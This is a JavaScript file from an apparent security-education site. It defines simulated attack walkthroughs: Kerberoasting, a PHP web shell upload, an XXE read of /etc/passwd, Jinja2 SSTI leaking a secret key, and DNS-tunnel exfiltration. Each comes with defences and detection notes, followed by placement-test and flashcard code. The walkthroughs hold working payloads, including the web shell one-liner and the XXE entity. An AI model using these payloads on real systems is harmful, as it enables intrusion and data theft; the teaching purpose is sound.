/* cipherops_tech — 06-learning.js */
/* =====================================================================
   MORE ATTACK EXPLORER SCENARIOS
   ===================================================================== */
XS.push(
 {id:"kerberoast",cat:"red",title:"Kerberoasting a service account",sub:"Any domain user can ask for the ticket",sev:"high",lesson:"ad",
  labels:{attacker:["Compromised PC","10.0.5.44","laptop"],app:["Domain controller","10.0.0.10","server"],db:["SQL server (svc_sql)","10.0.2.5","db"]},
  desc:"With a normal domain account, the attacker lists accounts that have service principal names (SPNs), then requests a Kerberos service ticket for one. Part of the ticket is encrypted with the service account's password hash, so it can be cracked offline if the password is weak.",
  props:{"ATT&CK":"T1558.003 Kerberoasting",Target:"Service accounts with SPNs",Entry:"Any authenticated domain user",Impact:"Service account takeover, often privileged",Detect:"Event 4769 with RC4 (0x17) tickets; one user requesting many SPNs",Fix:"gMSAs or 25+ character passwords; AES-only; alert on 4769 anomalies"},
  steps:[["Find SPN accounts",0],["Request service ticket",2],["Crack offline",3],["Log in as svc_sql",4]],
  packets:[
   p("attacker","app","LDAP","searchRequest (servicePrincipalName=*)","atk",0,"LDAP searchRequest  base: DC=corp,DC=local  filter: (&(objectCategory=user)(servicePrincipalName=*))  attrs: sAMAccountName, servicePrincipalName",[["Filter","(servicePrincipalName=*)","Every user account that runs a service.",1]]),
   p("app","attacker","LDAP","searchResEntry svc_sql  MSSQLSvc/sql01.corp.local","res",0,"searchResEntry  sAMAccountName: svc_sql  servicePrincipalName: MSSQLSvc/sql01.corp.local:1433  pwdLastSet: 2019-03-02",[["Target","svc_sql","A service account whose password hasn't changed since 2019.",1]]),
   p("attacker","app","Kerberos","TGS-REQ  MSSQLSvc/sql01  etype: RC4-HMAC (23)","atk",3,"KRB5 TGS-REQ  sname: MSSQLSvc/sql01.corp.local:1433  etype: [23 RC4-HMAC]  cname: j.smith",[["Downgrade","etype: [23 RC4-HMAC]","Asks for the weak RC4 encryption type, which is fast to crack.",1]]),
   p("app","attacker","Kerberos","TGS-REP  ticket enc-part (RC4, svc_sql key)","atk",3,"KRB5 TGS-REP  ticket: MSSQLSvc/sql01  enc-part: etype 23  cipher: 6a3f9b…e1 (1,234 bytes)",[["Crackable blob","cipher: 6a3f9b…e1","Encrypted with svc_sql's password hash. Taken offline for cracking: 'Summer2019!' falls in minutes.",1]]),
   p("attacker","db","TDS","Login svc_sql / Summer2019!  → sysadmin","alert",7,"TDS7 Login  user: CORP\\svc_sql  database: master  → login success (role: sysadmin)",[["Takeover","role: sysadmin","The cracked password works.",1]])],
  def:{ctrl:"gMSA + AES-only + 4769 alerting",node:"app",from:2,explain:"The service runs as a group managed service account with a 240-character random password, RC4 is disabled, and unusual ticket requests alert the SOC.",
   packets:[p("attacker","app","Kerberos","TGS-REQ  MSSQLSvc/sql01  etype: RC4-HMAC (23)","atk",3,"KRB5 TGS-REQ  etype: [23 RC4-HMAC]",[]),
    p("app","attacker","Kerberos","KRB-ERROR  KDC_ERR_ETYPE_NOSUPP (RC4 disabled)","blk",null,"KRB5 KRB-ERROR  error-code: 14 KDC_ERR_ETYPE_NOSUPP",[["RC4 off","KDC_ERR_ETYPE_NOSUPP","Only AES tickets are issued — and the gMSA password is uncrackable anyway."]]),
    p("app","siem","SYSLOG","ALERT 4769 RC4 ticket request for svc_sql by j.smith","blk",null,"EventID=4769 TicketEncryptionType=0x17 ServiceName=svc_sql Account=j.smith  → ALERT kerberoast-suspect",[["Detection","EventID=4769","Classic Kerberoasting signal."]])]}},

 {id:"webshell",cat:"web",title:"File upload → web shell",sub:"An 'avatar' that runs commands",sev:"critical",lesson:"upload",
  desc:"The avatar upload only checks the declared content type. The attacker uploads a PHP script, the server stores it inside the web root, and requesting it runs commands on the server.",
  props:{OWASP:"A06:2025 Insecure Design · A02 Misconfiguration",CWE:"CWE-434",Target:"Upload endpoint + web root",Entry:"File upload",Impact:"Remote code execution",Detect:"Executable extensions in uploads; requests to /uploads/*.php",Fix:"Allow-list + content sniffing; random names; store outside web root; no execution"},
  steps:[["Upload shell.php",0],["Stored in web root",2],["Run a command",3],["Code execution",5]],
  packets:[
   p("attacker","waf","HTTPS","POST /profile/avatar  shell.php (image/png)","atk",1,H(["POST /profile/avatar HTTP/1.1","Host: shop.example","Content-Type: multipart/form-data; boundary=x"],"--x\r\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\nContent-Type: image/png\r\n\r\n<?php system($_GET['cmd']); ?>\r\n--x--"),[["Filename","filename=\"shell.php\"","An executable extension.",1],["Lying type","Content-Type: image/png","The client claims it's an image.",1],["Payload","<?php system($_GET['cmd']); ?>","Runs whatever is passed in ?cmd=.",1]]),
   p("waf","app","HTTP","Forward POST /profile/avatar","atk",1,"POST /profile/avatar (forwarded)",[]),
   p("app","attacker","HTTPS","201 Created  {url: /uploads/shell.php}","atk",2,H(["HTTP/1.1 201 Created","Content-Type: application/json"],"{\"url\":\"/uploads/shell.php\"}"),[["Web root","/uploads/shell.php","Saved under its own name, inside the served folder.",1]]),
   p("attacker","waf","HTTPS","GET /uploads/shell.php?cmd=id","atk",2,H(["GET /uploads/shell.php?cmd=id HTTP/1.1","Host: shop.example"]),[["Command","cmd=id","Who am I on the server?",1]]),
   p("waf","app","HTTP","Forward GET /uploads/shell.php","atk",2,"GET /uploads/shell.php?cmd=id (forwarded)",[]),
   p("app","attacker","HTTPS","200 OK  uid=33(www-data)","alert",7,H(["HTTP/1.1 200 OK"],"uid=33(www-data) gid=33(www-data) groups=33(www-data)"),[["RCE","uid=33(www-data)","The attacker is running commands as the web server.",1]])],
  def:{ctrl:"Content checks + storage outside web root",node:"app",from:2,explain:"The server sniffs the real file type, rejects anything that isn't an image, renames files randomly and serves them from storage that never executes code.",
   packets:[p("app","attacker","HTTPS","415 Unsupported Media Type (content is PHP, not PNG)","blk",null,H(["HTTP/1.1 415 Unsupported Media Type"],"{\"error\":\"file content is not an allowed image type\"}"),[["Sniffed","file content is not an allowed image type","Magic bytes checked, not the client's claim."]]),
    p("attacker","waf","HTTPS","GET /uploads/shell.php?cmd=id","atk",2,"GET /uploads/shell.php?cmd=id",[]),
    p("waf","attacker","HTTPS","404 Not Found","blk",null,H(["HTTP/1.1 404 Not Found"]),[])]}},

 {id:"xxe",cat:"web",title:"XXE reads a local file",sub:"An XML entity that pulls in /etc/passwd",sev:"high",lesson:"xxe",
  desc:"An import endpoint parses XML with external entities enabled. The attacker defines an entity that points at a local file and references it in a field that's echoed back.",
  props:{OWASP:"A02:2025 Security Misconfiguration",CWE:"CWE-611",Target:"XML import endpoint",Entry:"Uploaded XML",Impact:"Local file read, SSRF",Detect:"<!DOCTYPE / <!ENTITY in request bodies",Fix:"Disable DTDs and external entities; prefer JSON"},
  steps:[["Malicious XML",0],["Parser expands entity",2]],
  packets:[
   p("attacker","waf","HTTPS","POST /api/import  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">","atk",1,H(["POST /api/import HTTP/1.1","Host: shop.example","Content-Type: application/xml"],"<?xml version=\"1.0\"?>\n<!DOCTYPE order [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<order><note>&xxe;</note></order>"),[["DTD","<!DOCTYPE order","Declares a document type with custom entities.",1],["External entity","SYSTEM \"file:///etc/passwd\"","Tells the parser to read a local file.",1],["Reference","&xxe;","Where the file's contents will be inserted.",1]]),
   p("waf","app","HTTP","Forward POST /api/import","atk",1,"POST /api/import (forwarded)",[]),
   p("app","attacker","HTTPS","200 OK  Imported note: root:x:0:0:…","alert",4,H(["HTTP/1.1 200 OK"],"{\"imported\":1,\"note\":\"root:x:0:0:root:/root:/bin/bash\\nwww-data:x:33:33::/var/www:/usr/sbin/nologin\"}"),[["File contents","root:x:0:0","The parser expanded the entity and the app echoed it back.",1]])],
  def:{ctrl:"DTDs & external entities disabled",node:"app",from:2,explain:"The parser refuses DOCTYPE declarations entirely, so the entity is never defined, let alone expanded.",
   packets:[p("app","attacker","HTTPS","400 Bad Request  DOCTYPE is disallowed","blk",null,H(["HTTP/1.1 400 Bad Request"],"{\"error\":\"DOCTYPE is disallowed when the feature disallow-doctype-decl is set\"}"),[["Parser setting","disallow-doctype-decl","The one-line fix in most XML libraries."]])]}},

 {id:"sstiflow",cat:"web",title:"SSTI leaks the app's secret key",sub:"{{7*7}} becomes 49",sev:"critical",lesson:"ssti",lab:"ssti",
  desc:"A greeting page builds its Jinja2 template by concatenating the name parameter. The attacker confirms evaluation with maths, then reads the configuration object, including the secret key used to sign sessions.",
  props:{OWASP:"A05:2025 Injection",CWE:"CWE-1336",Target:"Template rendering",Entry:"name parameter",Impact:"Secret disclosure, often code execution",Detect:"{{ }} or ${ } in parameters; template errors",Fix:"Pass input as template variables; sandboxed engines"},
  steps:[["Probe with maths",0],["It's evaluated",2],["Read config",3],["Secret leaked",5]],
  packets:[
   p("attacker","waf","HTTPS","GET /greet?name={{7*7}}","atk",0,H(["GET /greet?name=%7B%7B7*7%7D%7D HTTP/1.1","Host: cards.example"]),[["Probe","%7B%7B7*7%7D%7D","URL-encoded {{7*7}}.",1]]),
   p("waf","app","HTTP","Forward GET /greet","atk",0,"GET /greet?name={{7*7}} (forwarded)",[]),
   p("app","attacker","HTTPS","200 OK  Hello 49!","atk",2,H(["HTTP/1.1 200 OK","Content-Type: text/html"],"<h1>Hello 49!</h1>"),[["Evaluated","Hello 49!","The template engine ran our expression.",1]]),
   p("attacker","waf","HTTPS","GET /greet?name={{config}}","atk",2,H(["GET /greet?name=%7B%7Bconfig%7D%7D HTTP/1.1","Host: cards.example"]),[["Target object","%7B%7Bconfig%7D%7D","Flask exposes settings as config.",1]]),
   p("waf","app","HTTP","Forward GET /greet","atk",2,"GET /greet?name={{config}} (forwarded)",[]),
   p("app","attacker","HTTPS","200 OK  Hello <Config {'SECRET_KEY': '…'}>","alert",3,H(["HTTP/1.1 200 OK","Content-Type: text/html"],"<h1>Hello &lt;Config {'DEBUG': False, 'SECRET_KEY': 'f3c9…a71e'}&gt;!</h1>"),[["Secret key","'SECRET_KEY': 'f3c9…a71e'","Lets the attacker forge signed session cookies.",1]])],
  def:{ctrl:"Input passed as a template variable",node:"app",from:2,explain:"The template is fixed (Hello {{ name }}) and the input is passed in as data, so braces in the name are printed literally.",
   packets:[p("app","attacker","HTTPS","200 OK  Hello {{7*7}}!  (printed literally)","blk",null,H(["HTTP/1.1 200 OK"],"<h1>Hello {{7*7}}!</h1>"),[["Literal","Hello {{7*7}}!","Data, not template code."]]),
    p("attacker","waf","HTTPS","GET /greet?name={{config}}","atk",2,"GET /greet?name={{config}}",[]),
    p("waf","app","HTTP","Forward GET /greet","atk",2,"(forwarded)",[]),
    p("app","attacker","HTTPS","200 OK  Hello {{config}}!","blk",null,H(["HTTP/1.1 200 OK"],"<h1>Hello {{config}}!</h1>"),[])]}},

 {id:"dnstunnel",cat:"red",title:"DNS tunnelling exfiltration",sub:"Data hidden in subdomain names",sev:"high",lesson:"c2",labels:{app:["Compromised server","10.0.1.20","server"],evil:["Attacker's DNS server","ns1.tunnel-exfil.top","evil"]},
  desc:"Malware encodes stolen data into long subdomains. The company's own DNS resolver dutifully forwards each query to the attacker's authoritative name server, which collects the chunks and replies with commands in TXT records.",
  props:{"ATT&CK":"T1071.004 DNS · T1048 Exfiltration",Target:"Outbound DNS",Entry:"Already compromised host",Impact:"Data theft past web proxies",Detect:"High-entropy, very long subdomains; huge query volume to one domain",Fix:"DNS firewall / RPZ; force internal resolvers; anomaly alerts"},
  steps:[["Chunk #1 as a query",0],["Resolver forwards it",1],["Command back in TXT",2],["Thousands more chunks",4]],
  packets:[
   p("app","dns","DNS","Query TXT mzxw6ytboi.0001.tunnel-exfil.top","atk",5,"Query: mzxw6ytboiqhezltmnzq.0001.tunnel-exfil.top  type TXT",[["Encoded data","mzxw6ytboiqhezltmnzq","Base32-encoded chunk of a stolen file.",1],["Sequence","0001","Chunk number, so the attacker can reassemble it.",1]],0),
   p("dns","evil","DNS","Recursive query → ns1.tunnel-exfil.top","atk",5,"Query: mzxw6ytboiqhezltmnzq.0001.tunnel-exfil.top  type TXT  (recursion to authoritative NS)",[["Delivered","ns1.tunnel-exfil.top","The attacker runs the authoritative server, so every query reaches them.",1]],0.01),
   p("evil","dns","DNS","TXT \"ack;next=0002;cmd=none\"","atk",6,"Answer: TXT \"ack;next=0002;cmd=none\"",[["C2 channel","cmd=none","Replies can carry commands too.",1]],0.04),
   p("dns","app","DNS","TXT \"ack;next=0002;cmd=none\"","atk",6,"Answer: TXT \"ack;next=0002;cmd=none\"",[],0.05),
   p("app","dns","DNS","Query TXT …4127.tunnel-exfil.top  (4,127 queries in 90 s)","alert",5,"Query: gezdgnbvgy3tqojq.4127.tunnel-exfil.top  type TXT",[["Volume","4127","A whole database export, one subdomain at a time.",1]],90.2)],
  def:{ctrl:"DNS firewall (RPZ) + anomaly alerts",node:"dns",from:1,explain:"The resolver scores query names for entropy and length and blocks newly seen domains, returning NXDOMAIN and alerting on the host.",
   packets:[p("dns","app","DNS","NXDOMAIN (RPZ policy: tunnel-exfil.top blocked)","blk",null,"Response: NXDOMAIN  (policy: rpz-block  reason: high-entropy labels, domain age 2 days)",[["Blocked","rpz-block","The query never leaves the company."]]),
    p("dns","siem","SYSLOG","ALERT dns-tunnel-suspect fin-srv-02 → tunnel-exfil.top","blk",null,"<132> resolver: ALERT dns-tunnel host=10.0.1.20 domain=tunnel-exfil.top avg_label_len=52 entropy=4.6",[["Hunt lead","entropy=4.6","Random-looking names are the signature."]])]}}
);

/* =====================================================================
   PLACEMENT TEST — two questions per module, reused from lesson checks
   ===================================================================== */
const PLACEMENT = MODULES.flatMap(m=>{
  const basic=m.lessons.find(l=>l.level==="basic")||m.lessons[0];
  const adv=[...m.lessons].reverse().find(l=>l.level==="advanced")||m.lessons[m.lessons.length-1];
  return [basic,adv].map(l=>({mod:m.id,modTitle:m.title,lesson:l.id,level:l.level,...l.check}));
});
const MOD_PATH={basics:"beginner",web:"bughunter",mobile:"mobile",cloud:"cloud",red:"redblue",llm:"ai"};
let PT={i:0,ans:[],result:null};
try{ PT.result=JSON.parse(localStorage.getItem("cipherops-placement")||"null"); }catch(e){}
function renderPlacement(){
  const box=$("#ptBox"); if(!box) return; box.innerHTML="";
  if(PT.result && PT.i===0 && !PT.ans.length){ box.append(placementResult(PT.result)); return; }
  if(PT.i===0 && !PT.ans.length){
    box.append(el("div",{className:"pt-intro"},el("div",{className:"eyebrow"},"5 minutes · 12 questions"),el("h3",{},"Find your starting point"),
      el("p",{className:"muted"},"Two questions from each module, one basic and one advanced. There's no time limit and nothing is graded publicly. We'll suggest a path and the first lesson to open."),
      el("button",{className:"btn primary",onclick:()=>{PT={i:0,ans:[],result:null};PT.started=true;drawQ();}},"Start the placement test →")));
    if(PT.started) drawQ(); return; }
  drawQ();
  function drawQ(){
    box.innerHTML=""; const q=PLACEMENT[PT.i];
    box.append(el("div",{className:"pt-top"},el("span",{className:"tag"},q.modTitle),el("span",{className:"tag "+q.level},LEVEL_NAME[q.level]),el("span",{className:"muted mono",style:"margin-left:auto;font-size:12.5px"},(PT.i+1)+" / "+PLACEMENT.length)),
      el("div",{className:"bar",style:"margin:10px 0 14px"},el("i",{style:"width:"+(PT.i/PLACEMENT.length*100)+"%"})),
      el("h3",{style:"margin-bottom:12px"},q.q));
    const opts=el("div",{className:"opts"});
    q.o.forEach((o,k)=>opts.append(el("button",{className:"opt",onclick:()=>{ PT.ans[PT.i]=k===q.a; PT.i++; if(PT.i>=PLACEMENT.length) finish(); else drawQ(); }},o)));
    box.append(opts, el("div",{className:"row2",style:"margin-top:12px"},el("button",{className:"btn sm ghost",onclick:()=>{ PT.ans[PT.i]=false; PT.i++; if(PT.i>=PLACEMENT.length) finish(); else drawQ(); }},"I don't know yet — skip")));
  }
  function finish(){
    const per={}; PLACEMENT.forEach((q,k)=>{ per[q.mod]=(per[q.mod]||0)+(PT.ans[k]?1:0); });
    const total=Object.values(per).reduce((a,b)=>a+b,0);
    const level= total<=4?"basic":total<=8?"intermediate":"advanced";
    const weakest=Object.keys(per).filter(k=>k!=="basics").sort((a,b)=>per[a]-per[b])[0];
    const path= total<=4 || per.basics<2 ? "beginner" : MOD_PATH[weakest];
    PT.result={total,per,level,path,date:new Date().toISOString().slice(0,10)}; try{ localStorage.setItem("cipherops-placement",JSON.stringify(PT.result)); }catch(e){}
    PT.i=0; PT.ans=[]; PT.started=false; renderPlacement(); toast("Placement saved — your path is ready");
  }
}
function placementResult(r){
  const P=PATHS.find(p=>p.id===r.path), first=P.lessons.find(id=>!done.has(id))||P.lessons[0], L=LESSONS.find(l=>l.id===first);
  const w=el("div",{className:"pt-res"});
  w.append(el("div",{className:"eyebrow"},"Your placement · "+r.date),el("h3",{},LEVEL_NAME[r.level]+" — "+r.total+" of 12"),
    el("p",{className:"muted"},"Recommended path: ",el("b",{},P.title),". "+P.blurb));
  const grid=el("div",{className:"pt-mods"}); MODULES.forEach(m=>{ const v=r.per[m.id]||0; grid.append(el("div",{className:"pt-mod"},el("span",{},m.title),el("span",{className:"pips2"},[0,1].map(k=>el("i",{className:k<v?"on":""}))))); });
  w.append(grid, el("div",{className:"row2"},el("button",{className:"btn primary",onclick:()=>openLesson(first,true)},"Start: "+L.title+" →"),
    el("button",{className:"btn sm",onclick:()=>document.getElementById("paths").scrollIntoView({behavior:reduced?"auto":"smooth"})},"See the path"),
    el("button",{className:"btn sm ghost",onclick:()=>{PT={i:0,ans:[],result:null,started:true};renderPlacement();}},"Retake")));
  return w;
}

/* =====================================================================
   FLASHCARDS — spaced repetition (Leitner boxes)
   ===================================================================== */
const INTERVALS=[0,1,3,7,16,35]; // days per box
function buildCards(){
  const c=[];
  LESSONS.forEach(l=>{ c.push({id:"q-"+l.id,deck:l.mod.id,lesson:l.id,front:l.check.q,back:l.check.o[l.check.a],note:l.check.why});
    c.push({id:"k-"+l.id,deck:l.mod.id,lesson:l.id,front:"Key ideas: "+l.title,back:l.keys.join("\n"),note:""}); });
  CHEATS.find(x=>x.id==="ports").rows.forEach(r=>c.push({id:"port-"+r[0],deck:"ref",front:"Port "+r[0]+" — what usually listens here?",back:r[1],note:r[2]}));
  CHEATS.find(x=>x.id==="status").rows.forEach(r=>c.push({id:"http-"+r[0],deck:"ref",front:"HTTP "+r[0]+" — what does it mean?",back:r[1],note:r[2]}));
  return c;
}
let CARDS=null; const FC={state:{},deck:"mine",cur:null,flipped:false,reviewedToday:0};
try{ Object.assign(FC.state,JSON.parse(localStorage.getItem("cipherops-cards")||"{}")); }catch(e){}
const today=()=>new Date().toISOString().slice(0,10);
const addDays=(d,n)=>{ const t=new Date(d+"T00:00:00"); t.setDate(t.getDate()+n); return t.toISOString().slice(0,10); };
function deckCards(){ CARDS=CARDS||buildCards();
  if(FC.deck==="mine"){ const mine=CARDS.filter(c=>c.lesson&&done.has(c.lesson)); return mine.length?mine:CARDS.filter(c=>c.deck==="basics"); }
  if(FC.deck==="all") return CARDS; return CARDS.filter(c=>c.deck===FC.deck); }
function dueCards(){ const t=today(); return deckCards().filter(c=>{ const s=FC.state[c.id]; return !s || s.due<=t; }); }
function rate(card,grade){ // 0 again, 1 hard, 2 good, 3 easy
  const s=FC.state[card.id]||{box:0,due:today(),n:0};
  s.box = grade===0?0 : grade===1?Math.max(1,s.box) : Math.min(INTERVALS.length-1,s.box+(grade===3?2:1));
  s.due = addDays(today(), grade===0?0:INTERVALS[s.box]); s.n++;
  FC.state[card.id]=s; try{ localStorage.setItem("cipherops-cards",JSON.stringify(FC.state)); }catch(e){}
  FC.reviewedToday++; FC.flipped=false; FC.cur=null; renderCards();
}
function renderCards(){
  const W=$("#fcBox"); if(!W) return; W.innerHTML="";
  const decks=[["mine","My lessons"],["all","All lessons"],["ref","Ports & status codes"]].concat(MODULES.map(m=>[m.id,m.short]));
  const due=dueCards(), all=deckCards(), learned=all.filter(c=>FC.state[c.id]&&FC.state[c.id].box>=3).length;
  W.append(el("div",{className:"fc-top"},el("div",{className:"filters"},decks.map(([k,t])=>el("button",{"aria-pressed":String(FC.deck===k),onclick:()=>{FC.deck=k;FC.cur=null;FC.flipped=false;renderCards();}},t))),
    el("div",{className:"fc-stats mono"},el("span",{},"due ",el("b",{},String(due.length))),el("span",{},"learned ",el("b",{},learned+"/"+all.length)),el("span",{},"today ",el("b",{},String(FC.reviewedToday))))));
  if(FC.deck==="mine" && !LESSONS.some(l=>done.has(l.id))) W.append(el("p",{className:"muted",style:"font-size:14.5px"},"Finish a lesson to add its cards here. Until then, here are the Security Basics cards."));
  if(!due.length){ const next=all.map(c=>FC.state[c.id]&&FC.state[c.id].due).filter(Boolean).sort()[0];
    W.append(el("div",{className:"card fc-card done"},el("h3",{},"All caught up 🎉"),el("p",{className:"muted"},next?"Next card is due on "+next+".":"Pick another deck to keep going."))); return; }
  if(!FC.cur || !due.includes(FC.cur)) FC.cur=due[0];
  const c=FC.cur, s=FC.state[c.id];
  const card=el("button",{className:"card fc-card"+(FC.flipped?" flipped":""),"aria-label":FC.flipped?"Answer side":"Question side — press Space to flip",onclick:()=>{FC.flipped=!FC.flipped;renderCards();}},
    el("div",{className:"fc-meta mono"},(c.deck==="ref"?"Reference":MODULES.find(m=>m.id===c.deck).title)+(s?" · box "+s.box:" · new")),
    el("div",{className:"fc-front"},c.front),
    FC.flipped?el("div",{className:"fc-back"},el("div",{className:"fc-ans"},c.back),c.note?el("div",{className:"muted",style:"font-size:15px;margin-top:8px"},c.note):null):el("div",{className:"muted mono",style:"font-size:12.5px;margin-top:14px"},"Click or press Space to reveal"));
  W.append(card);
  if(FC.flipped) W.append(el("div",{className:"fc-rate"},[["Again","1 · see it again today"],["Hard","2 · tomorrow"],["Good","3 · a few days"],["Easy","4 · much later"]].map(([t,h],g)=>el("button",{className:"btn"+(g===2?" primary":""),title:h,onclick:()=>rate(c,g)},t,el("small",{},h.split(" · ")[1])))));
  if(c.lesson) W.append(el("button",{className:"btn sm ghost",style:"margin-top:8px",onclick:()=>openLesson(c.lesson,true)},"Open lesson: "+LESSONS.find(l=>l.id===c.lesson).title));
}
document.addEventListener("keydown",e=>{ const sec=document.getElementById("review"); if(!sec) return; const r=sec.getBoundingClientRect(); if(r.top>innerHeight||r.bottom<0) return;
  if(/INPUT|TEXTAREA|SELECT/.test(document.activeElement.tagName)) return; if(document.activeElement.closest&&document.activeElement.closest("#xp")) return;
  if(e.key===" "&&FC.cur){ e.preventDefault(); FC.flipped=!FC.flipped; renderCards(); } else if(FC.flipped&&FC.cur&&/^[1-4]$/.test(e.key)){ rate(FC.cur,+e.key-1); } });
